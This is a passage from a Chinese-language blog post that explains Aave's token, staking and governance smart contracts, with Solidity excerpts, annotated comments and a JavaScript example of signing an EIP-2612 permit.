class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function permit(</span><br><span class="line">    address owner,</span><br><span class="line">    address spender,</span><br><span class="line">    uint256 value,</span><br><span class="line">    uint256 deadline,</span><br><span class="line">    uint8 v,</span><br><span class="line">    bytes32 r,</span><br><span class="line">    bytes32 s</span><br><span class="line">) external &#123;</span><br><span class="line">    require(owner != address(0), &quot;INVALID_OWNER&quot;);</span><br><span class="line">    //solium-disable-next-line</span><br><span class="line">    require(block.timestamp &lt;= deadline, &quot;INVALID_EXPIRATION&quot;);</span><br><span class="line">    uint256 currentValidNonce = _nonces[owner];</span><br><span class="line">    bytes32 digest = keccak256(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                &quot;\x19\x01&quot;,</span><br><span class="line">                DOMAIN_SEPARATOR,</span><br><span class="line">                keccak256(</span><br><span class="line">                    abi.encode(PERMIT_TYPEHASH, owner, spender, value, currentValidNonce, deadline))</span><br><span class="line">                )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    require(owner == ecrecover(digest, v, r, s), &quot;INVALID_SIGNATURE&quot;);</span><br><span class="line">    _nonces[owner] = currentValidNonce.add(1);</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; signTypedData_v4 &#125; <span class="keyword">from</span> <span class="string">&#x27;eth-sig-util&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; fromRpcSig &#125; <span class="keyword">from</span> <span class="string">&#x27;ethereumjs-util&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... other imports</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AaveTokenAbi</span> <span class="keyword">from</span> <span class="string">&quot;./AaveTokenAbi.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... setup your web3 provider</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> aaveTokenAddress = <span class="string">&quot;AAVE_TOKEN_ADDRESS&quot;</span></span><br><span class="line"><span class="keyword">const</span> aaveTokenContract = <span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(<span class="title class_">AaveTokenAbi</span>, aaveTokenAddress)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> privateKey = <span class="string">&quot;YOUR_PRIVATE_KEY_WITHOUT_0x&quot;</span></span><br><span class="line"><span class="keyword">const</span> chainId = <span class="number">1</span></span><br><span class="line"><span class="keyword">const</span> owner = <span class="string">&quot;OWNER_ADDRESS&quot;</span></span><br><span class="line"><span class="keyword">const</span> spender = <span class="string">&quot;SPENDER_ADDRESS&quot;</span></span><br><span class="line"><span class="keyword">const</span> value = <span class="number">100</span> <span class="comment">// Amount the spender is permitted</span></span><br><span class="line"><span class="keyword">const</span> nonce = <span class="number">1</span> <span class="comment">// The next valid nonce, use `_nonces()`</span></span><br><span class="line"><span class="keyword">const</span> deadline = <span class="number">1600093162</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> permitParams = &#123;</span><br><span class="line">  <span class="attr">types</span>: &#123;</span><br><span class="line">    <span class="title class_">EIP712Domain</span>: [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;name&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;string&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;version&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;string&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;chainId&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;uint256&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;verifyingContract&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;address&quot;</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="title class_">Permit</span>: [</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;owner&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;address&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;spender&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;address&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;value&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;uint256&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;nonce&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;uint256&quot;</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">name</span>: <span class="string">&quot;deadline&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;uint256&quot;</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">primaryType</span>: <span class="string">&quot;Permit&quot;</span>,</span><br><span class="line">  <span class="attr">domain</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Aave Token&quot;</span>,</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="attr">chainId</span>: chainId,</span><br><span class="line">    <span class="attr">verifyingContract</span>: aaveTokenAddress,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">message</span>: &#123;</span><br><span class="line">    owner,</span><br><span class="line">    spender,</span><br><span class="line">    value,</span><br><span class="line">    nonce,</span><br><span class="line">    deadline,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> signature = <span class="title function_">signTypedData_v4</span>(</span><br><span class="line">  <span class="title class_">Buffer</span>.<span class="title function_">from</span>(privateKey, <span class="string">&quot;hex&quot;</span>),</span><br><span class="line">  &#123; <span class="attr">data</span>: permitParams &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; v, r, s &#125; = <span class="title function_">fromRpcSig</span>(signature)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> aaveTokenContract.<span class="property">methods</span></span><br><span class="line">    .<span class="title function_">permit</span>(&#123;</span><br><span class="line">      owner,</span><br><span class="line">      spender,</span><br><span class="line">      value,</span><br><span class="line">      deadline,</span><br><span class="line">      v,</span><br><span class="line">      r,</span><br><span class="line">      s</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">send</span>()</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">`Error permitting: <span class="subst">$&#123;e.message&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>配备了快照机制，每次转账，mint，销毁之前，都会拍一次快照</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* @dev Writes a snapshot for an owner of tokens</span><br><span class="line">* @param owner The owner of the tokens</span><br><span class="line">* @param oldValue The value before the operation that is gonna be executed after the snapshot</span><br><span class="line">* @param newValue The value after the operation</span><br><span class="line">*/</span><br><span class="line">function _writeSnapshot(address owner, uint128 oldValue, uint128 newValue) internal &#123;</span><br><span class="line">    uint128 currentBlock = uint128(block.number);</span><br><span class="line"></span><br><span class="line">    uint256 ownerCountOfSnapshots = _countsSnapshots[owner];</span><br><span class="line">    mapping (uint256 =&gt; Snapshot) storage snapshotsOwner = _snapshots[owner];</span><br><span class="line"></span><br><span class="line">    // Doing multiple operations in the same block</span><br><span class="line">    if (ownerCountOfSnapshots != 0 &amp;&amp; snapshotsOwner[ownerCountOfSnapshots.sub(1)].blockNumber == currentBlock) &#123;</span><br><span class="line">        snapshotsOwner[ownerCountOfSnapshots.sub(1)].value = newValue;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        snapshotsOwner[ownerCountOfSnapshots] = Snapshot(currentBlock, newValue);</span><br><span class="line">        _countsSnapshots[owner] = ownerCountOfSnapshots.add(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit SnapshotDone(owner, oldValue, newValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* @dev Writes a snapshot before any operation involving transfer of value: _transfer, _mint and _burn</span><br><span class="line">* - On _transfer, it writes snapshots for both &quot;from&quot; and &quot;to&quot;</span><br><span class="line">* - On _mint, only for _to</span><br><span class="line">* - On _burn, only for _from</span><br><span class="line">* @param from the from address</span><br><span class="line">* @param to the to address</span><br><span class="line">* @param amount the amount to transfer</span><br><span class="line">*/</span><br><span class="line">function _beforeTokenTransfer(address from, address to, uint256 amount) internal override &#123;</span><br><span class="line">    if (from == to) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (from != address(0)) &#123;</span><br><span class="line">        uint256 fromBalance = balanceOf(from);</span><br><span class="line">        _writeSnapshot(from, uint128(fromBalance), uint128(fromBalance.sub(amount)));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to != address(0)) &#123;</span><br><span class="line">        uint256 toBalance = balanceOf(to);</span><br><span class="line">        _writeSnapshot(to, uint128(toBalance), uint128(toBalance.add(amount)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // caching the aave governance address to avoid multiple state loads</span><br><span class="line">    ITransferHook aaveGovernance = _aaveGovernance;</span><br><span class="line">    if (aaveGovernance != ITransferHook(0)) &#123;</span><br><span class="line">        aaveGovernance.onTransfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安全模块"><a href="#安全模块" class="headerlink" title="安全模块"></a>安全模块</h2><h3 id="质押"><a href="#质押" class="headerlink" title="质押"></a>质押</h3><ul><li>onBehalfOf：获得stkToken的地址，一般是给自己</li><li>amount：质押AAVE Token的数量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function stake(address onBehalfOf, uint256 amount) external override &#123;</span><br><span class="line">  require(amount != 0, &#x27;INVALID_ZERO_AMOUNT&#x27;);</span><br><span class="line">  uint256 balanceOfUser = balanceOf(onBehalfOf);</span><br><span class="line"></span><br><span class="line">  // 更新用户资产情况，得到用户到目前为止利润的累计数量（如果之前stake过）</span><br><span class="line">  uint256 accruedRewards = _updateUserAssetInternal(</span><br><span class="line">    onBehalfOf, // 进行stake的用户</span><br><span class="line">    address(this), // stkToken</span><br><span class="line">    balanceOfUser, // 用户拥有多少stkToken</span><br><span class="line">    totalSupply() // stkToken总量</span><br><span class="line">  );</span><br><span class="line">  // 如果上次到这次有累计利润，则把可以领取的利润记录下来，</span><br><span class="line">  // stake之后质押的金额会变多，得到的利润速率也会变化，因此需要把之前的利润先记录</span><br><span class="line">  if (accruedRewards != 0) &#123;</span><br><span class="line">    emit RewardsAccrued(onBehalfOf, accruedRewards);</span><br><span class="line">    stakerRewardsToClaim[onBehalfOf] = stakerRewardsToClaim[onBehalfOf].add(accruedRewards);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 更新冷却时间，其实就是说你stake之后，不能马上取款，根据一定的算法来设置你可以取款利润的时间</span><br><span class="line">  stakersCooldowns[onBehalfOf] = getNextCooldownTimestamp(0, amount, onBehalfOf, balanceOfUser);</span><br><span class="line"></span><br><span class="line">  _mint(onBehalfOf, amount);</span><br><span class="line">  IERC20(STAKED_TOKEN).safeTransferFrom(msg.sender, address(this), amount);</span><br><span class="line"></span><br><span class="line">  emit Staked(msg.sender, onBehalfOf, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取利润"><a href="#获取利润" class="headerlink" title="获取利润"></a>获取利润</h3><p>可以看出，利润的token又是另外一种新的token</p><ul><li>to：接收利润token的地址</li><li>amount：提取多少利润，-1表示全部提取</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function claimRewards(address to, uint256 amount) external override &#123;</span><br><span class="line">  // 查看目前已累计的利润金额</span><br><span class="line">  uint256 newTotalRewards = _updateCurrentUnclaimedRewards(</span><br><span class="line">    msg.sender,</span><br><span class="line">    balanceOf(msg.sender),</span><br><span class="line">    false</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  // amount=-1表示领取完所有利润，否则领取amount数量</span><br><span class="line">  uint256 amountToClaim = (amount == type(uint256).max) ? newTotalRewards : amount;</span><br><span class="line">  stakerRewardsToClaim[msg.sender] = newTotalRewards.sub(amountToClaim, &quot;INVALID_AMOUNT&quot;);</span><br><span class="line"></span><br><span class="line">  // 发送奖励token</span><br><span class="line">  REWARD_TOKEN.safeTransferFrom(REWARDS_VAULT, to, amountToClaim);</span><br><span class="line"></span><br><span class="line">  emit RewardsClaimed(msg.sender, to, amountToClaim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取款-1"><a href="#取款-1" class="headerlink" title="取款"></a>取款</h3><p>设计</p><ul><li>存款之后，需要等待COOLDOWN_SECONDS之后，才可以取款，并且要在UNSTAKE_WINDOW时间内取款，否则无法取款</li><li>如果超过了取款时间，则需要调用<code>cooldown()</code>刷新时间，重新等待</li></ul><p>这么设计的原因</p><ul><li>COOLDOWN_SECONDS：防止用户短时间内不断重复质押提现这个操作</li><li>UNSTAKE_WINDOW：AAVE的业务逻辑，我们猜不到他为什么这么设计</li></ul><p>参数</p><ul><li>to：接收存款的地址</li><li>amount：提取多少存款，如果提取金额大于质押金额，则表示提取完所有，否则提取部分</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function redeem(address to, uint256 amount) external override &#123;</span><br><span class="line">  require(amount != 0, &#x27;INVALID_ZERO_AMOUNT&#x27;);</span><br><span class="line"></span><br><span class="line">  // 取款要达到冷却时间COOLDOWN_SECONDS之后取款，质押之后不能马上取款</span><br><span class="line">  // 比如 COOLDOWN_SECONDS = 2days</span><br><span class="line">  uint256 cooldownStartTimestamp = stakersCooldowns[msg.sender];</span><br><span class="line">  // 那么从开始质押到取款，至少要等2days</span><br><span class="line">  require(</span><br><span class="line">    block.timestamp &gt; cooldownStartTimestamp.add(COOLDOWN_SECONDS),</span><br><span class="line">    &#x27;INSUFFICIENT_COOLDOWN&#x27;</span><br><span class="line">  );</span><br><span class="line">  // 假如UNSTAKE_WINDOW = 4 days，那么在2 days之后我可以取款，但是 4 days之后，我就无法取款了，</span><br><span class="line">  // 需要调用cooldown()来更新冷却，然后再等待，再在窗口期取款</span><br><span class="line">  require(</span><br><span class="line">    block.timestamp.sub(cooldownStartTimestamp.add(COOLDOWN_SECONDS)) &lt;= UNSTAKE_WINDOW,</span><br><span class="line">    &#x27;UNSTAKE_WINDOW_FINISHED&#x27;</span><br><span class="line">  );</span><br><span class="line">  // 获取msg.sender的stkToken数量</span><br><span class="line">  uint256 balanceOfMessageSender = balanceOf(msg.sender);</span><br><span class="line"></span><br><span class="line">  // 如果想要提取的金额大于质押的金额，则取款所有；否则取款部分</span><br><span class="line">  uint256 amountToRedeem = (amount &gt; balanceOfMessageSender) ? balanceOfMessageSender : amount;</span><br><span class="line"></span><br><span class="line">  // 更新用户未领取的利润</span><br><span class="line">  _updateCurrentUnclaimedRewards(msg.sender, balanceOfMessageSender, true);</span><br><span class="line"></span><br><span class="line">  // 烧掉用户的stkToken</span><br><span class="line">  _burn(msg.sender, amountToRedeem);</span><br><span class="line"></span><br><span class="line">  // 如果用户是全部取完，则冷却时间改成0</span><br><span class="line">  if (balanceOfMessageSender.sub(amountToRedeem) == 0) &#123;</span><br><span class="line">    stakersCooldowns[msg.sender] = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  IERC20(STAKED_TOKEN).safeTransfer(to, amountToRedeem);</span><br><span class="line"></span><br><span class="line">  emit Redeem(msg.sender, to, amountToRedeem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冷却"><a href="#冷却" class="headerlink" title="冷却"></a>冷却</h3><p>根据发送者/接收者时间戳计算冷却时间戳。</p><ul><li>fromCooldownTimestamp：发送者的冷却时间戳</li><li>amountToReceive：要发送的 stkAAVE 代币数量</li><li>toAddress：接收者地址</li><li>toBalance：接收者余额</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function getNextCooldownTimestamp(</span><br><span class="line">    uint256 fromCooldownTimestamp,</span><br><span class="line">    uint256 amountToReceive,</span><br><span class="line">    address toAddress,</span><br><span class="line">    uint256 toBalance</span><br><span class="line">  ) public returns (uint256)</span><br></pre></td></tr></table></figure><h3 id="view方法-1"><a href="#view方法-1" class="headerlink" title="view方法"></a>view方法</h3><ul><li><code>stakersCooldowns()</code>：mapping，获取用户的冷却时间</li></ul><h2 id="治理"><a href="#治理" class="headerlink" title="治理"></a>治理</h2><p>合约</p><ul><li>AaveProtoGovernance：处理大部分投票逻辑</li><li>AssetVotingWeightProvider：将资产列入白名单并设置投票权重</li><li>AavePropositionPower：控制协议治理的权限，例如注册新提案</li><li>GovernanceParamsProvider：存储全局协议治理参数，例如注册新提案所需的提案权阈值</li></ul><p>执行流程</p><ol><li>创建：提案由具有足够提案权的用户创建。在早期阶段，这是 Genesis 团队。</li><li>投票：提案进入“投票”阶段，持续时间为<code>_votingBlocksDuration</code>。通过AaveProtoGovernance的<code>submitVoteByVoter()</code>进行投票</li><li>验证：如果投票数额达到<code>_threshold</code>，该提案将进入“验证”阶段。验证持续时间为_validatingBlocksDuration。<ul><li>如果投票数没达到<code>_threshold</code>，则提案将保留在“投票”阶段，直至<code>_threshold</code>达成。</li><li>在“验证”阶段，任何人都可以通过调用<code>challengeVoters()</code>来质疑（并取消无效）投票。如果当前投票代币余额低于投票时的投票代币余额，则投票被视为无效。</li><li>这个从“验证”到“投票”的过程最多可以发生<code>_maxMovesToVotingAllowed</code>次，之后如果没有通过，则被认为是“过期Expired”。</li></ul></li><li>结束：_validatingBlocksDuration之后，提案执行，状态更改为‘Executed’<ol><li>如果投票数目超过<code>_threshold</code>，则调用<code>execute()</code>执行提案</li><li>.如果尚未达到投票数<code>_threshold</code>，则不会执行任何提案代码。</li></ol></li></ol><h3 id="如何投票"><a href="#如何投票" class="headerlink" title="如何投票"></a>如何投票</h3><ul><li>获取提案 ID 列表<ul><li>使用<code>AaveProtoGovernance</code>合约发出的事件：<code>ProposalCreated()</code></li><li>链上：使用<code>try...catch</code>模式迭代提案 ID，从索引 0 开始</li><li>通过 GraphQL：查询AAVE的<a href="https://docs.aave.com/developers/v/1.0/integrating-aave/using-graphql#aaves-subgraphs">subgraph</a>以接收提案及其 ID 的列表</li></ul></li><li>查询提案数据<ul><li>链上：使用<code>getProposalBasicData()</code></li><li>通过 GraphQL：<a href="https://docs.aave.com/developers/v/1.0/integrating-aave/using-graphql#aaves-subgraphs">subgraph</a></li></ul></li><li>投票<ul><li>有了提案ID，调用<code>submitVoteByVoter()</code>进行投票，如果调用了一次之后再次调用，则下一次调用覆盖上次调用，以最新的投票为准</li><li>使用<code>cancelVoteByVoter()</code>进行取消投票</li></ul></li><li>获取提案状态<ul><li>链上调用<code>getProposalBasicData()</code></li><li><a href="https://docs.aave.com/developers/v/1.0/integrating-aave/using-graphql#aaves-subgraphs">subgraph</a></li></ul></li></ul><h3 id="投票"><a href="#投票" class="headerlink" title="投票"></a>投票</h3><p>输入提案ID，投票数目</p><ul><li>_proposalId：提案ID</li><li>_vote：0表示弃权，1表示同意，2表示否决</li><li>_asset：锁定的资产，用于投票，只有在合约中列入白名单的情况下才允许投票</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function submitVoteByVoter(uint256 _proposalId, uint256 _vote, IERC20 _asset) external &#123;</span><br><span class="line">    internalSubmitVote(_proposalId, _vote, msg.sender, _asset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳到实际逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  function internalSubmitVote(uint256 _proposalId, uint256 _vote, address _voter, IERC20 _asset) internal &#123;</span><br><span class="line">  // 获取提案</span><br><span class="line">      Proposal storage _proposal = proposals[_proposalId];</span><br><span class="line">      // 该提案要处于投票期</span><br><span class="line">      require(_proposal.proposalStatus == ProposalStatus.Voting, &quot;VOTING_STATUS_REQUIRED&quot;);</span><br><span class="line">      // 资产的投票权重，0代表不允许投票，也就是该资产并不是白名单中的</span><br><span class="line">      uint256 _assetVotingWeight = govParamsProvider.getAssetVotingWeightProvider().getVotingWeight(_asset);</span><br><span class="line">      require(_assetVotingWeight != 0, &quot;ASSET_NOT_LISTED&quot;);</span><br><span class="line">      // 只能输入0、1、2</span><br><span class="line">      require(_vote &lt;= COUNT_CHOICES, &quot;INVALID_VOTE_PARAM&quot;);</span><br><span class="line">      // 没有足够的资产不得投票</span><br><span class="line">      uint256 _voterAssetBalance = _asset.balanceOf(_voter);</span><br><span class="line">      require(_voterAssetBalance &gt; 0, &quot;INVALID_VOTER_BALANCE&quot;);</span><br><span class="line"></span><br><span class="line">      // 如果之前投票过了，则这次投票将覆盖上次</span><br><span class="line">      if (address(_proposal.voters[_voter].asset) != address(0)) &#123;</span><br><span class="line">          internalCancelVote(_proposalId, _voter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">// 写入投票信息</span><br><span class="line">      uint256 _assetWeight = _assetVotingWeight;</span><br><span class="line">      uint256 _votingPower = _voterAssetBalance.mul(_assetWeight);</span><br><span class="line">      _proposal.totalVotes = _proposal.totalVotes.add(1);</span><br><span class="line">      _proposal.votes[_vote] = _votingPower.add(_proposal.votes[_vote]);</span><br><span class="line">      Voter storage voter = _proposal.voters[_voter];</span><br><span class="line">      voter.vote = _vote;</span><br><span class="line">      voter.weight = _assetWeight;</span><br><span class="line">      voter.balance = _voterAssetBalance;</span><br><span class="line">      voter.asset = _asset;</span><br><span class="line">      voter.nonce = voter.nonce.add(1);</span><br><span class="line"></span><br><span class="line">      emit VoteEmitted(_proposalId, _voter, _vote, voter.asset, _assetWeight, _voterAssetBalance);</span><br><span class="line"></span><br><span class="line">// 投票之后，如果在投票的有效期内达到了投票阈值， 则该提案进入有效模式</span><br><span class="line">      tryToMoveToValidating(_proposalId);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>判断提案是否进入有效模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function tryToMoveToValidating(uint256 _proposalId) public &#123;</span><br><span class="line">    Proposal storage _proposal = proposals[_proposalId];</span><br><span class="line">    require(_proposal.proposalStatus == ProposalStatus.Voting, &quot;VOTING_STATUS_REQUIRED&quot;);</span><br><span class="line">    if (_proposal.currentStatusInitBlock.add(_proposal.votingBlocksDuration) &lt;= block.number) &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt;= COUNT_CHOICES; i++) &#123;</span><br><span class="line">            if (_proposal.votes[i] &gt; _proposal.threshold) &#123;</span><br><span class="line">            // 设置该提案为有效</span><br><span class="line">                internalMoveToValidating(_proposalId);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取消投票"><a href="#取消投票" class="headerlink" 